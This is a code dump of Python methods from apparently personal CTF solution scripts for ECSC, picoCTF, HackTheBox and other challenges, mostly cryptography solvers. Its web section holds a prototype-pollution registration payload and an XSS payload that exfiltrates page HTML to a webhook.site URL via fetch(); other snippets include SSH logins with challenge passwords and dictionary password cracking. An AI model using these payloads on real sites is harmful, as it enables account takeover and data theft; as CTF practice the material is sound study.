            &#34;user.__proto__.payloads&#34;: [&#34;none&#34;],
            &#34;user.__proto__.authKeyFile&#34;: True,
        }
        r = requests.post(f&#34;{base_url}/api/register&#34;, json=payload)

        # /home/figaro/CTF/Categories/Web/ECSC/Missing_Essence/payloads/solution.py
    def main(self):
        self.base_url = f&#34;http://{self.url}:{self.port}&#34;
        cookie = self.create_token(&#34;admin&#34;)
        headers = {&#34;Cookie&#34;: f&#34;session={cookie}&#34;}
        print(cookie)
        self.pollute(self.base_url)
        req = requests.get(f&#34;{self.base_url}/panel&#34;, headers=headers)
        flag = self.re_match_partial_flag(text=req.text, origin=&#34;ECSC&#34;)
        print(flag)

        # /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def generate_payload(self, attacker_url):
        payload = &#34;&#34;&#34;
        &lt;script&gt;
        const iframe = document.createElement(&#39;iframe&#39;);
        iframe.srcdoc = `
        &lt;script&gt;
        window.parent.postMessage({
            style: {
            &#34;webkitUserModify&#34;: &#34;read-write&#34;
            }
        }, &#39;*&#39;);
        &lt;\\/script&gt;
    `;
        document.body.appendChild(iframe);

        setTimeout(() =&gt; {
            window.find(&#39;Here&#39;);
            document.execCommand(&#39;insertHTML&#39;, false, `&lt;img src=x onerror=&#34;fetch(&#39;EXFIL_URL&#39;+this.parentElement.outerHTML)&#34;&gt;`)
        }, 1000);
        &lt;/script&gt;
        &#34;&#34;&#34;.replace(
            &#34;EXFIL_URL&#34;, attacker_url
        )

        return payload

        # /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def generate_url(self, attacker_url, payload):
        &#34;&#34;&#34;
        Description:
            Generate a URL with the given attacker URL and payload.

        Args:
            attacker_url (_type_): _description_
            payload (_type_): _description_

        Returns:
            _type_: _description_
        &#34;&#34;&#34;
        base_url = &#34;http://localhost/index.php&#34;

        parsed_url = urllib.parse.quote(payload)
        print(parsed_url)
        params_suffix = &#34;&amp;p=1&#34; * 1500
        return f&#34;{base_url}?xss={parsed_url}{params_suffix}&#34;

        # /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def send_to_bot(self, payload_url):
        &#34;&#34;&#34;
        Description:
            Send the payload URL to the bot.

        Args:
            payload_url (_type_): _description_

        Returns:
            _type_: _description_
        &#34;&#34;&#34;
        headers = {&#34;Content-Type&#34;: &#34;application/x-www-form-urlencoded&#34;}
        data = {&#34;url&#34;: payload_url}
        response = requests.post(self.bot_url, headers=headers, data=data)
        return response.text

        # /home/figaro/CTF/Categories/Web/ECSC/CheesyWeb/payloads/solution.py
    def main(self):
        self.url_ful = f&#34;http://{self.url}:{self.port}&#34;
        self.base_url = f&#34;{self.url_ful}/index.php&#34;
        self.bot_url = f&#34;{self.url_ful}/bot.php&#34;

        attacker_url = &#34;https://webhook.site/73ea9e99-e3cc-4b42-a040-4c7c107406b6?leak=&#34;
        payload = self.generate_payload(attacker_url)
        payload_url = self.generate_url(attacker_url, payload)
        response = self.send_to_bot(payload_url)
        print(response)

        # /home/figaro/CTF/Categories/General/picoCTF/SansAlpha/payloads/solution.py
    def main(self):
        user = &#34;ctf-player&#34;
        host = &#34;mimas.picoctf.net&#34;
        port = 50399
        password = &#34;6dd28e9b&#34;

        self.conn = self.pwn.ssh(user, host, port, password)

        # print(repr(self.conn(&#34;ls&#34;)))
        self.conn.interactive(&#34;/bin/sh&#34;)

        # /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def main(self):
        self.password = &#34;8a707622&#34;
        self.user = &#34;ctf-player&#34;
        self.host = &#34;saturn.picoctf.net&#34;
        self.port = 54157

        self.ssh_connect(
            user=self.user, host=self.host, port=self.port, password=self.password
        )
        self.interactive()

        # /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def ssh_connect(self, **kwargs):
        &#34;&#34;&#34;
        Descrption : Establish SSH connection
        Parameters :
            - user : username
            - host : hostname
            - port : port number
            - password : password

        Returns : None
        &#34;&#34;&#34;
        user = kwargs.get(&#34;user&#34;, self.user)
        host = kwargs.get(&#34;host&#34;, self.host)
        port = kwargs.get(&#34;port&#34;, self.port)
        password = kwargs.get(&#34;password&#34;, self.password)

        if any([user is None, host is None, port is None, password is None]):
            raise &#34;Invalid SSH connection parameters&#34;
            return

        self.ssh_connection = self.pwn.ssh(user, host, port, password)

        # /home/figaro/CTF/Categories/General/picoCTF/Special/payloads/solution.py
    def interactive(self):
        &#34;&#34;&#34;
        Descrption : Start an interactive session
        Parameters : None
        Returns : None
        &#34;&#34;&#34;
        self.ssh_connection.interactive()

        # /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def from_hex(self, hex_string):
        return bytes.fromhex(hex_string).decode(&#34;utf-8&#34;)

        # /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def hex_to_string(self, hex_string):
        &#34;&#34;&#34;
        Description: Convert hex string to ascii string

        Analytical:
        - Split the hex string by space
        - Convert each hex value to ascii character
        - Join the ascii characters to form the ascii string

        Args:
            hex_string (str): Hex string to convert to ascii

        Returns:
            str: Ascii string
        &#34;&#34;&#34;
        hex_string = hex_string.split(&#34; &#34;)
        return &#34;&#34;.join([chr(int(i, 16)) for i in hex_string])

        # /home/figaro/CTF/Categories/General/picoCTF/ASCII_Numbers/payloads/solution.py
    def main(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            data = f.read().strip()

        flag = self.hex_to_string(data)

        print(flag)

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) &lt; len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return &#34;&#34;.join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_5/payloads/solution.py
    def main(self):
        dictionary = self.Path(self.folder_files, &#34;dictionary.txt&#34;)
        with open(dictionary, &#34;r&#34;) as f:
            self.pos_pw_list = f.read().splitlines()
        file_hash = self.Path(self.folder_files, &#34;level5.hash.bin&#34;)
        with open(file_hash, &#34;rb&#34;) as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, &#34;rb&#34;) as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) &lt; len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return &#34;&#34;.join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_3/payloads/solution.py
    def main(self):
        self.pos_pw_list = [&#34;8799&#34;, &#34;d3ab&#34;, &#34;1ea2&#34;, &#34;acaf&#34;, &#34;2295&#34;, &#34;a9de&#34;, &#34;6f3d&#34;]
        file_hash = self.Path(self.folder_files, &#34;level3.hash.bin&#34;)
        with open(file_hash, &#34;rb&#34;) as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, &#34;rb&#34;) as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def str_xor(self, secret, key):
        # extend key to secret length
        new_key = key
        i = 0
        while len(new_key) &lt; len(secret):
            new_key = new_key + key[i]
            i = (i + 1) % len(key)
        return &#34;&#34;.join(
            [
                chr(ord(secret_c) ^ ord(new_key_c))
                for (secret_c, new_key_c) in zip(secret, new_key)
            ]
        )

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def hash_pw(self, pw_str):
        pw_bytes = bytearray()
        pw_bytes.extend(pw_str.encode())
        m = hashlib.md5()
        m.update(pw_bytes)
        return m.digest()

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def bruteforcing(self):
        for pw in self.pos_pw_list:
            user_pw_hash = self.hash_pw(pw)
            if user_pw_hash == self.correct_pw_hash:
                return pw

        # /home/figaro/CTF/Categories/General/picoCTF/PW_Crack_4/payloads/solution.py
    def main(self):
        self.pos_pw_list = [
            &#34;158f&#34;,
            &#34;1655&#34;,
            &#34;d21e&#34;,
            &#34;4966&#34;,
            &#34;ed69&#34;,
            &#34;1010&#34;,
            &#34;dded&#34;,
            &#34;844c&#34;,
            &#34;40ab&#34;,
            &#34;a948&#34;,
            &#34;156c&#34;,
            &#34;ab7f&#34;,
            &#34;4a5f&#34;,
            &#34;e38c&#34;,
            &#34;ba12&#34;,
            &#34;f7fd&#34;,
            &#34;d780&#34;,
            &#34;4f4d&#34;,
            &#34;5ba1&#34;,
            &#34;96c5&#34;,
            &#34;55b9&#34;,
            &#34;8a67&#34;,
            &#34;d32b&#34;,
            &#34;aa7a&#34;,
            &#34;514b&#34;,
            &#34;e4e1&#34;,
            &#34;1230&#34;,
            &#34;cd19&#34;,
            &#34;d6dd&#34;,
            &#34;b01f&#34;,
            &#34;fd2f&#34;,
            &#34;7587&#34;,
            &#34;86c2&#34;,
            &#34;d7b8&#34;,
            &#34;55a2&#34;,
            &#34;b77c&#34;,
            &#34;7ffe&#34;,
            &#34;4420&#34;,
            &#34;e0ee&#34;,
            &#34;d8fb&#34;,
            &#34;d748&#34;,
            &#34;b0fe&#34;,
            &#34;2a37&#34;,
            &#34;a638&#34;,
            &#34;52db&#34;,
            &#34;51b7&#34;,
            &#34;5526&#34;,
            &#34;40ed&#34;,
            &#34;5356&#34;,
            &#34;6ad4&#34;,
            &#34;2ddd&#34;,
            &#34;177d&#34;,
            &#34;84ae&#34;,
            &#34;cf88&#34;,
            &#34;97a3&#34;,
            &#34;17ad&#34;,
            &#34;7124&#34;,
            &#34;eff2&#34;,
            &#34;e373&#34;,
            &#34;c974&#34;,
            &#34;7689&#34;,
            &#34;b8b2&#34;,
            &#34;e899&#34;,
            &#34;d042&#34;,
            &#34;47d9&#34;,
            &#34;cca9&#34;,
            &#34;ab2a&#34;,
            &#34;de77&#34;,
            &#34;4654&#34;,
            &#34;9ecb&#34;,
            &#34;ab6e&#34;,
            &#34;bb8e&#34;,
            &#34;b76b&#34;,
            &#34;d661&#34;,
            &#34;63f8&#34;,
            &#34;7095&#34;,
            &#34;567e&#34;,
            &#34;b837&#34;,
            &#34;2b80&#34;,
            &#34;ad4f&#34;,
            &#34;c514&#34;,
            &#34;ffa4&#34;,
            &#34;fc37&#34;,
            &#34;7254&#34;,
            &#34;b48b&#34;,
            &#34;d38b&#34;,
            &#34;a02b&#34;,
            &#34;ec6c&#34;,
            &#34;eacc&#34;,
            &#34;8b70&#34;,
            &#34;b03e&#34;,
            &#34;1b36&#34;,
            &#34;81ff&#34;,
            &#34;77e4&#34;,
            &#34;dbe6&#34;,
            &#34;59d9&#34;,
            &#34;fd6a&#34;,
            &#34;5653&#34;,
            &#34;8b95&#34;,
            &#34;d0e5&#34;,
        ]

        file_hash = self.Path(self.folder_files, &#34;level4.hash.bin&#34;)
        with open(file_hash, &#34;rb&#34;) as f:
            self.correct_pw_hash = f.read()

        with open(self.challenge_file, &#34;rb&#34;) as f:
            self.flag_enc = f.read()

        pw = self.bruteforcing()
        flag = self.str_xor(self.flag_enc.decode(), pw)
        print(flag)

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/ReadMyCert/payloads/solution.py
    def parse_csr(self):
        with open(self.challenge_file, &#34;rb&#34;) as f:
            csr_data = f.read()

        csr = crypto.load_certificate_request(crypto.FILETYPE_PEM, csr_data)
        # Print the parsed CSR
        for i in range(csr.get_subject().get_components().__len__()):
            print(csr.get_subject().get_components()[i])

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/ReadMyCert/payloads/solution.py
    def main(self):
        self.parse_csr()

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def main(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            enc_flag_data = f.read().strip().split(&#34;\n&#34;)

        a = enc_flag_data[0].split(&#34; = &#34;)[1]
        b = enc_flag_data[1].split(&#34; = &#34;)[1]
        cipher = enc_flag_data[2].split(&#34;: &#34;)[1].strip(&#34;[]&#34;).split(&#34;, &#34;)
        a = int(a)
        b = int(b)
        cipher = [int(c) for c in cipher]

        p = self.finding_next_prime(a)
        g = self.finding_next_prime(b)

        u = self.generator(g, a, p)
        v = self.generator(g, b, p)

        key = self.generator(v, a, p)
        b_key = self.generator(u, b, p)
        if key == b_key:
            shared_key = key

        # print(shared_key)
        semi_plaintext = self.decrypt(cipher, shared_key)
        tex_key = &#34;trudeau&#34;

        flag = self.dynamic_xor_decrypt(&#34;&#34;.join(semi_plaintext), tex_key)
        flag = flag[::-1]
        print(flag)

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def generator(self, g, x, p):
        return pow(g, x) % p

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def is_prime(self, p):
        v = 0
        for i in range(2, p + 1):
            if p % i == 0:
                v = v + 1
        if v &gt; 1:
            return False
        else:
            return True

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def finding_next_prime(self, number, n=None):
        if n:
            for _ in range(number, number + n):
                if self.is_prime(number):
                    return number
        else:
            while True:
                number = number + 1
                if self.is_prime(number):
                    return number

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def dynamic_xor_encrypt(self, plaintext, text_key):
        cipher_text = &#34;&#34;
        key_length = len(text_key)
        for i, char in enumerate(plaintext[::-1]):
            key_char = text_key[i % key_length]
            encrypted_char = chr(ord(char) ^ ord(key_char))
            cipher_text += encrypted_char
        return cipher_text

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def dynamic_xor_decrypt(self, plaintext, text_key):
        cipher_text = &#34;&#34;
        key_length = len(text_key)
        for i, char in enumerate(plaintext):
            key_char = text_key[i % key_length]
            encrypted_char = chr(ord(char) ^ ord(key_char))
            cipher_text += encrypted_char
        return cipher_text

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def encrypt(self, plaintext, key):
        cipher = []
        for char in plaintext:
            cipher.append(((ord(char) * key * 311)))
        return cipher

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/Custom_Encryption/payloads/solution.py
    def decrypt(self, cipher_list, key):
        plaintext = []
        for char in cipher_list:
            plaintext.append(chr(int(char / key / 311)))
        return plaintext

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def get_message(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            self.message_data = f.read().strip()

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def context(self, number):
        if 0 &lt;= number &lt;= 25:
            # Uppercase
            return chr(ord(&#34;A&#34;) + number)
        elif 26 &lt;= number &lt;= 35:
            # Numbers
            return chr(ord(&#34;0&#34;) + number - 26)
        elif number == 36:
            return &#34;_&#34;
        else:
            return str(number)

        # /home/figaro/CTF/Categories/Cryptography/picoCTF/basic_mod1/payloads/solution.py
    def main(self):
        self.get_message()

        flag = [self.context(int(i) % 37) for i in self.message_data.split(&#34; &#34;)]

        flag = &#34;&#34;.join(flag)

        flag = &#34;picoCTF{&#34; + flag + &#34;}&#34;

        print(flag)

        # /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.passwords_source = b64decode(
            b&#34;aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3RzL21hc3Rlci9QYXNzd29yZHMvQ29tbW9uLUNyZWRlbnRpYWxzLzEway1tb3N0LWNvbW1vbi50eHQ=&#34;
        ).decode()

        # /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def get_online_passwords(self):
        r = requests.get(self.passwords_source)
        self.password_list = r.text.split(&#34;\n&#34;)

        # /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def decrypting_vigenere(self, ciphertext, key):
        key = key.lower()
        plaintext = &#34;&#34;
        for i, ch in enumerate(ciphertext):
            if ch.isalpha():
                nch = ord(ch) - 97
                nk = ord(key[i % len(key)]) - 97
                plaintext += chr((nch - nk + 26) % 26 + 97)
            else:
                plaintext += ch
        return plaintext

        # /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def brute_force(
        self,
        ciphertext,
        password_list,
        cleartext: str = None,
        verbose: bool = False,
        tryall=False,
    ):

        for i, password in enumerate(password_list):
            if password.strip() == &#34;&#34;:
                continue

            if verbose:
                if i % 100 == 0:
                    print(f&#34;Trying password {i+1}/{len(password_list)}: {password}&#34;)

            decrypted = ciphertext
            for _ in range(2):

                decrypted = self.decrypting_vigenere(decrypted, password)

            if cleartext is not None:
                if cleartext in decrypted:
                    if verbose:
                        print(f&#34;Found password: {password}&#34;)
                        print(f&#34;Decrypted text: {decrypted}&#34;)
                    if not tryall:
                        return password, decrypted
            else:
                if decrypted.isprintable() and len(decrypted) &gt; 10:
                    if verbose:
                        print(f&#34;Found valid password: {password}&#34;)
                        print(f&#34;Decrypted text: {decrypted}&#34;)
                    # return password, decrypted

        if verbose:
            print(&#34;No valid password found.&#34;)
        return None, None

        # /home/figaro/CTF/Categories/Cryptography/bsides/ViSquared/payloads/solution.py
    def main(self):

        with open(self.challenge_file, &#34;r&#34;) as f:
            ciphertext = f.read().strip()

        self.get_online_passwords()
        print(&#34;Starting brute force...&#34;)

        password, decrypted_text = self.brute_force(
            ciphertext,
            password_list=self.password_list,
            cleartext=&#34;htb&#34;,
            verbose=True,
            tryall=True,
        )

        # /home/figaro/CTF/Categories/Cryptography/CSCG/Insecure/payloads/solution.py
    def main(self):
        e = 65537
        n = 1034776851837418228051242693253376923
        c = 1006234941664191676977296641660749407

        # from factordb.com
        p = 1086027579223696553
        q = 952809000096560291

        # Calculations start here
        phi = (p - 1) * (q - 1)

        d = inverse(e, phi)

        decrypted_m = pow(c, d, n)
        # print(decrypted_m)
        print(&#34;csc{&#34; + str(decrypted_m) + &#34;}&#34;)

        # /home/figaro/CTF/Categories/Cryptography/ReplyCode/KeiPybAras_Revenge/payloads/solution.py
    def main(self):

        # Known plaintext
        test = b&#34;Capybara friends, mission accomplished! We&#39;ve caused a blackout, let&#39;s meet at the bar to celebrate!&#34;

        # Parse from output file
        with open(self.folfil(&#34;files&#34;, &#34;output.txt&#34;), &#34;r&#34;) as f:
            contents = f.read().split(&#34;\n&#34;)

        test_dt, test_ts, test_cipher = contents[0].split(&#34; &#34;)
        test_cipher = bytes.fromhex(test_cipher)

        flag_dt, flag_ts, flag_cipher = contents[1].split(&#34; &#34;)
        flag_cipher = bytes.fromhex(flag_cipher)

        # Get test cipher and flag cipher timestamp hashes

        test_ts = int(
            (
                cal.timegm(t.strptime(test_dt + &#34; &#34; + test_ts, &#34;%Y-%m-%d %H:%M:%S.%f&#34;))
                + float(&#34;.&#34; + test_ts.split(&#34;.&#34;)[1])
            )
            * 1000
        ).to_bytes(16, byteorder=&#34;big&#34;)
        test_ts = md5(test_ts).digest()

        flag_ts = int(
            (
                cal.timegm(t.strptime(flag_dt + &#34; &#34; + flag_ts, &#34;%Y-%m-%d %H:%M:%S.%f&#34;))
                + float(&#34;.&#34; + flag_ts.split(&#34;.&#34;)[1])
            )
            * 1000
        ).to_bytes(16, byteorder=&#34;big&#34;)
        flag_ts = md5(flag_ts).digest()

        # Divide ciphers into blocks
        test_blocks = [test_cipher[i : i + 16] for i in range(0, len(test_cipher), 16)]
        flag_blocks = [flag_cipher[i : i + 16] for i in range(0, len(flag_cipher), 16)]

        # Reverse the xor by timestamp
        test_dexored = b&#34;&#34;
        for block in test_blocks:
            block_with_xor = bytes(a ^ b for a, b in zip(block, test_ts))
            test_dexored += block_with_xor

        flag_dexored = b&#34;&#34;
        for block in flag_blocks:
            block_with_xor = bytes(a ^ b for a, b in zip(block, flag_ts))
            flag_dexored += block_with_xor

        # Extract key from known plaintext
        key = bytes(a ^ b for a, b in zip(test, test_dexored))

        # Decrypt flag
        flag = bytes(a ^ b for a, b in zip(key, flag_dexored))

        print(key)
        print(flag)

        # The XOR of two ciphertexts (output from your previous step)
        # cipher_xor = b&#34;~I\x9c\x9a\xdd\x83\xe2\x9e\xd4@\x18\x84\xbd~\xec B\xf67\xbf...&#34;

        cipher_xor = flag

        # Known part of the flag (assuming it&#39;s at the beginning)
        known_flag = b&#34;FLG&#34;

        # XOR the known flag with the first bytes of the ciphertext XOR result
        keystream_guess = self.xor_bytes(cipher_xor[: len(known_flag)], known_flag)

        # Use the guessed keystream to decrypt more of one plaintext
        possible_plaintext = self.xor_bytes(
            cipher_xor, keystream_guess * (len(cipher_xor) // len(keystream_guess) + 1)
        )

        print(&#34;Recovered plaintext guess:&#34;, possible_plaintext.decode(errors=&#34;ignore&#34;))

        # /home/figaro/CTF/Categories/Cryptography/ReplyCode/KeiPybAras_Revenge/payloads/solution.py
    def xor_bytes(self, a, b):
        return bytes(x ^ y for x, y in zip(a, b))

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Secure_Encryption_Service/payloads/solution.py
    def solve(self):
        pass

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Secure_Encryption_Service/payloads/solution.py
    def main(self):

        conn_1 = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )

        conn_2 = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )

        # For the local connection, we need to edit the server.py file
        conn_1.challenge_file = self.Path(self.folders[&#34;data&#34;], &#34;edited_server.py&#34;)
        conn_2.challenge_file = self.Path(self.folders[&#34;data&#34;], &#34;edited_server.py&#34;)

        # Initialize the connection on both
        conn_1.initiate_connection()
        conn_2.initiate_connection()

        conn_1.recv_send(text_until=&#34;&gt; &#34;, text=&#34;1&#34;)
        encflag = conn_1.recv_lines(1, save=True)[0].decode().strip()
        encflag = bytes.fromhex(encflag)

        conn_2.recv_send(text_until=&#34;&gt; &#34;, text=&#34;2&#34;)
        conn_2.recv_send(text_until=&#34;: &#34;, text=&#34;00&#34; * len(encflag))

        xor_with_this = conn_2.recv_lines(1, save=True)[0].decode().strip()

        xor_with_this = bytes.fromhex(xor_with_this)

        print(self.pwn.xor(xor_with_this, encflag))

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def xor(self, a, b):
        return bytes(
            [a[i % len(a)] ^ b[i % len(b)] for i in range(max(len(a), len(b)))]
        )

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def open_file(self):
        with open(self.challenge_file, &#34;r&#34;) as f:
            data = f.read().split(&#34;\n&#34;)
            n = int(data[0].split(&#34;= &#34;)[1])
            enc_flag = data[1].split(&#34;= &#34;)[1]
            c = data[2].split(&#34;= &#34;)[1]
        return n, enc_flag, c

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Megalh_padata/payloads/solution.py
    def main(self):

        n, enc_flag, c = self.open_file()

        m = b&#34;1337&#34;

        c_rsa = pow(bytes_to_long(m), 3, n)

        otp = self.xor(long_to_bytes(c_rsa), bytes.fromhex(c))

        rsa_flag = self.xor(bytes.fromhex(enc_flag), otp)[:-5]

        m, _ = iroot(bytes_to_long(rsa_flag), 3)
        m = long_to_bytes(m)
        print(m)

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Missing_Reindeer/payloads/solution.py
    def main(self):
        self.key = &#34;&#34;
        key_pub = self.Path(self.folder_files, &#34;key.pub&#34;)
        with open(key_pub, &#34;r&#34;) as f:
            self.key = RSA.importKey(f.read())
        self.n = self.key.n
        self.e = self.key.e

        self.crypted = b&#34;Ci95oTkIL85VWrJLVhns1O2vyBeCd0weKp9o3dSY7hQl7CyiIB/D3HaXQ619k0+4FxkVEksPL6j3wLp8HMJAPxeA321RZexR9qwswQv2S6xQ3QFJi6sgvxkN0YnXtLKRYHQ3te1Nzo53gDnbvuR6zWV8fdlOcBoHtKXlVlsqODku2GvkTQ/06x8zOAWgQCKj78V2mkPiSSXf2/qfDp+FEalbOJlILsZMe3NdgjvohpJHN3O5hLfBPdod2v6iSeNxl7eVcpNtwjkhjzUx35SScJDzKuvAv+6DupMrVSLUfcWyvYUyd/l4v01w+8wvPH9l&#34;

        self.msg = bytes_to_long(b64decode(self.crypted))

        cleartext = self.find_invpow(self.msg, 3)
        cleartext = long_to_bytes(int(cleartext))

        print(cleartext)

        # /home/figaro/CTF/Categories/Cryptography/NTUA/Missing_Reindeer/payloads/solution.py
    def find_invpow(self, x, n):
        &#34;&#34;&#34;Finds the integer component of the n&#39;th root of x,
        an integer such that y ** n &lt;= x &lt; (y + 1) ** n.
        &#34;&#34;&#34;
        high = 1
        while high**n &lt; x:
            high *= 2
        low = high // 2
        while low &lt; high:
            mid = (low + high) // 2
            if low &lt; mid and mid**n &lt; x:
                low = mid
            elif high &gt; mid and mid**n &gt; x:
                high = mid
            else:
                return mid
        return mid + 1

        # /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def md5_hash(self, s):
        return md5(s.encode()).hexdigest()

        # /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def find_collision(
        self, target_hash, max_length=10, prefix=&#34;&#34;, suffix=&#34;&#34;, lengthy=False
    ):
        # Define the character set to use for generating combinations
        charset = (
            string.ascii_letters + string.digits
        )  # You can add special characters if needed

        if lengthy:
            for length in range(1, max_length + 1):
                for combination in itertools.product(charset, repeat=length):
                    candidate = prefix + &#34;&#34;.join(combination) + suffix
                    print(candidate, self.md5_hash(candidate), self.target_hash)

                    if self.md5_hash(candidate) == target_hash:
                        return candidate
        else:
            # Iterate over lengths from 1 to max_length
            for combination in itertools.product(
                charset, repeat=max_length - len(prefix) - len(suffix)
            ):
                candidate = prefix + &#34;&#34;.join(combination) + suffix
                print(candidate, self.md5_hash(candidate), self.target_hash)
                if self.md5_hash(candidate) == target_hash:
                    return candidate
        return None

        # /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def bruteforce(self):
        self.users = {
            &#34;HTBUser132&#34;: [md5(b&#34;HTBUser132&#34;).hexdigest(), &#34;secure123!&#34;],
            &#34;JohnMarcus&#34;: [md5(b&#34;JohnMarcus&#34;).hexdigest(), &#34;0123456789&#34;],
        }

        # The target hash for &#34;HTBUser 132&#34;
        self.target_hash = self.md5_hash(&#34;HTBUser132&#34;)

        self.collision = self.find_collision(
            self.target_hash,
            max_length=len(&#34;HTBUser132&#34;),
            prefix=&#34;&#34;,
            suffix=&#34;&#34;,
            lengthy=True,
        )
        print(
            f&#34;Found collision: {self.collision} with hash: {self.md5_hash(self.collision)}&#34;
        )

        # /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def known_colissions(self):
        one = {
            &#34;username&#34;: &#34;TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&#34;,
            &#34;password&#34;: &#34;verysecure&#34;,
        }
        two = {
            &#34;username&#34;: &#34;TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&#34;,
            &#34;password&#34;: &#34;verysecure&#34;,
        }

        print(f&#34;Hash one: {self.md5_hash(one[&#39;username&#39;])}&#34;)
        print(f&#34;Hash two: {self.md5_hash(two[&#39;username&#39;])}&#34;)

        # /home/figaro/CTF/Categories/Cryptography/HTB/alphascii_clashing/payloads/solution.py
    def main(self):
        # self.bruteforce()
        self.known_colissions()

        # /home/figaro/CTF/Categories/Cryptography/HTB/MuTLock/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Cryptography/HTB/sugar_free_candies/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.v1 = 4196604293528562019178729176959696479940189487937638820300425092623669070870963842968690664766177268414970591786532318240478088400508536
        self.v2 = 11553755018372917030893247277947844502733193007054515695939193023629350385471097895533448484666684220755712537476486600303519342608532236
